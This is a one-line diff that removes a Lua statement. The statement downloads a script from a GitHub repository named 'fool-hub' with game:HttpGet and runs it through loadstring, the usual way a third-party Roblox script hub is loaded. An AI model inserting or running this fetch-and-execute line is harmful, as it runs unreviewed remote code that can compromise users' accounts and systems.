@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OneFool/fool-hub/main/thing3"))()
